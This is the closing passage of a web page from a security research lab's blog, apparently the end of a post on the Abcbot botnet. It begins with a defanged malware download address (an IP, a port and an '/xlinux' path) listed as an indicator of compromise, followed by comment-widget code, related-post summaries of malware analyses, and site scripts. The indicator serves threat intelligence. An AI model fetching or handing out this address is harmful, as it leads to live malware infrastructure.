http://103[.209.103.16:26800/xlinux
</code></pre>
<!--kg-card-end: markdown-->
      </section>



      <div id="disqus_thread" class="disqus-comments gh-canvas"></div>
      <script>
        var disqus_config = function () {
          this.page.url = "https://blog.netlab.360.com/abcbot_an_evolving_botnet_en/";
          this.page.identifier = "ghost-618a237c3819e50007635d57"
        };
        (function () {
          var d = document, s = d.createElement('script');
          s.src = 'https://blog-netlab-360.disqus.com/embed.js';
          s.setAttribute('data-timestamp', +new Date());
          (d.head || d.body).appendChild(s);
        })();
      </script>
    </article>

  </main>


    <aside class="read-more-wrap outer">
      <div class="inner">
        <div class="read-more-feed">
            <article class="read-more-card" 
                  style="background-image: url(/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg)" 
              >
              <header class="read-more-card-header">
                <small class="read-more-card-header-sitetitle">&mdash; 360 Netlab Blog - Network Security Research Lab at 360 &mdash;</small>
                <h3 class="read-more-card-header-title"><a href="/tag/ddos/">DDoS</a></h3>
              </header>
              <div class="read-more-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"/></svg>
</div>
              <div class="read-more-card-content">
                <ul>
                  <li><a href="/new-ddos-botnet-wszeor/">快讯：使用21个漏洞传播的DDoS家族WSzero已经发展到第4个版本</a></li>
                  <li><a href="/fodcha-is-coming-back-with-rddos/">Fodcha Is Coming Back, Raising A Wave of Ransom  DDoS</a></li>
                  <li><a href="/ddosmonster_the_return_of__fodcha_cn/">卷土重来的DDoS狂魔：Fodcha僵尸网络再次露出獠牙</a></li>
                </ul>
              </div>
              <footer class="read-more-card-footer">
                <a href="/tag/ddos/">See all 56 posts →</a>
              </footer>
            </article>

          
<article class="post-card post tag-import-2022-11-30-11-16 no-image">


  <div class="post-card-content">

    <a class="post-card-content-link" href="/li-yong-namesilo-parkinghe-googlede-zi-ding-yi-ye-mian-lai-chuan-bo-e-yi-ruan-jian/">
      <header class="post-card-header">
        <div class="post-card-tags">
          <span class="post-card-primary-tag">Import 2022-11-30 11:16</span>
        </div>
        <h2 class="post-card-title">
          快讯：利用namesilo Parking和Google的自定义页面来传播恶意软件
        </h2>
      </header>
      <div class="post-card-excerpt">摘要


近期，我们发现一个GoELF可疑样本，分析得知是一个downloder，主要传播挖矿。有意思的地方在于传播方式，利用了namesilo的Parking页面，以及Google的用户自定义页面来传播样本及配置，从而可以躲避跟踪。


该样本最开始被友商腾讯安全团队捕获，不过传播链条分析中，对namesilo parking域名的分析不太准确。往往大家以为，域名停靠期间(Domain Parking），页面显示内容是被域名停靠供应商强制限定的，域名实际拥有者并不能修改其页面内容。但在这个案例中，域名停靠供应商允许域名拥有者自定义停靠页面。攻击者利用了这一点，再加上Google提供的自定义页面来传播自己的木马。


这样做有两个显而易见的好处：一方面攻击者几乎不需要为恶意代码的传播付出任何带宽和服务器的费用；另一方面攻击者将自己的恶意行为隐藏在大型互联网基础服务供应商的巨大流量中，所谓大隐于市，以此隐藏自己的行踪使得更难被检测和追踪。


在我们的DNSMon/DTA监测数据中显示，这种趋势在最近几月有上升迹象，值得安全社区注意。



缘起


在10.13号，我们的BotnetM</div>
    </a>

    <footer class="post-card-meta">
      <ul class="author-list">
        <li class="author-list-item">
          <div class="author-name-tooltip">
            Alex.Turing
          </div>

          <a href="/author/alex/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2019/06/turing.PNG" alt="Alex.Turing" />
          </a>
        </li>
        <li class="author-list-item">
          <div class="author-name-tooltip">
            Hui Wang
          </div>

          <a href="/author/huiwang/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2017/05/WechatIMG1.jpeg" alt="Hui Wang" />
          </a>
        </li>
        <li class="author-list-item">
          <div class="author-name-tooltip">
            YANG XU
          </div>

          <a href="/author/xuy1202/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2019/04/head.jpg" alt="YANG XU" />
          </a>
        </li>
      </ul>
      <time class="post-card-meta-date" datetime=" 2021-11-11">Nov 11, 2021</time>
      <span class="post-card-meta-length">5 min read</span>
    </footer>

  </div>

</article>
          
<article class="post-card post tag-ddos tag-miner tag-golang tag-botnet tag-dga tag-import-2022-11-30-11-16 no-image">


  <div class="post-card-content">

    <a class="post-card-content-link" href="/abcbot_an_evolving_botnet_cn/">
      <header class="post-card-header">
        <div class="post-card-tags">
          <span class="post-card-primary-tag">DDoS</span>
        </div>
        <h2 class="post-card-title">
          僵尸网络Abcbot的进化之路
        </h2>
      </header>
      <div class="post-card-excerpt">背景


业务上云、安全上云是近年来业界的发展趋势之一。360Netlab 从自身擅长的技术领域出发，也在持续关注云上安全事件和趋势。下面就是我们近期观察到的一起，被感染设备IP来自多个云供应商平台的安全事件。


2021年7月14日，360BotMon系统发现一个未知的ELF文件(a14d0188e2646d236173b230c59037c7)产生了大量扫描流量，经过分析，我们确定这是一个Go语言实现的Scanner，基于其源码路径中&quot;abc-hello&quot;字串，我们内部将它命名为Abcbot。


Abcbot在当时的时间节点上功能比较简单，可以看成是一个攻击Linux系统的扫描器，通过弱口令&amp;Nday漏洞实现蠕虫式传播。一个有意思的事情是，Abcbot的源码路径中有“dga.go”字串，但是在样本中并没有发现相关的DGA实现，我们推测其作者会在后续的版本中补上这个功能，这让我们对这个家族多了几分留意。


随着时间的推移，Abcbot也在持续更新，如我们所料，它在后继的样本中加入了DGA特性。如今Abcbot除了拥有蠕虫式传僠的能力，还有自更新，Webserver，DDoS等功</div>
    </a>

    <footer class="post-card-meta">
      <ul class="author-list">
        <li class="author-list-item">
          <div class="author-name-tooltip">
            Alex.Turing
          </div>

          <a href="/author/alex/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2019/06/turing.PNG" alt="Alex.Turing" />
          </a>
        </li>
        <li class="author-list-item">
          <div class="author-name-tooltip">
            Hui Wang
          </div>

          <a href="/author/huiwang/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2017/05/WechatIMG1.jpeg" alt="Hui Wang" />
          </a>
        </li>
      </ul>
      <time class="post-card-meta-date" datetime=" 2021-11-09">Nov 9, 2021</time>
      <span class="post-card-meta-length">13 min read</span>
    </footer>

  </div>

</article>
        </div>
      </div>
    </aside>



    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://blog.netlab.360.com">360 Netlab Blog - Network Security Research Lab at 360</a> &copy; 2024</section>
            <div><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>


<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=42b57cac00"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();

    // floating-header
    // Start fitVids
      var $postContent = $(".gh-content");
      $postContent.fitVids();
      // End fitVids

      var progressBar = document.querySelector('#reading-progress');
      var header = document.querySelector('.floating-header');
      var title = document.querySelector('.article-title');

      var lastScrollY = window.scrollY;
      var lastWindowHeight = window.innerHeight;
      var lastDocumentHeight = $(document).height();
      var ticking = false;

      function onScroll() {
        lastScrollY = window.scrollY;
        requestTick();
      }

      function onResize() {
        lastWindowHeight = window.innerHeight;
        lastDocumentHeight = $(document).height();
        requestTick();
      }

      function requestTick() {
        if (!ticking) {
          requestAnimationFrame(update);
        }
        ticking = true;
      }

      function update() {
        var trigger = title.getBoundingClientRect().top + window.scrollY;
        var triggerOffset = title.offsetHeight + 35;
        var progressMax = lastDocumentHeight - lastWindowHeight;

        // show/hide floating header
        if (lastScrollY >= trigger + triggerOffset) {
          header.classList.add('floating-active');
        } else {
          header.classList.remove('floating-active');
        }

        progressBar.setAttribute('max', progressMax);
        progressBar.setAttribute('value', lastScrollY);

        ticking = false;
      }

      window.addEventListener('scroll', onScroll, { passive: true });
      window.addEventListener('resize', onResize, false);

      update();
});
</script>



</body>
</html>
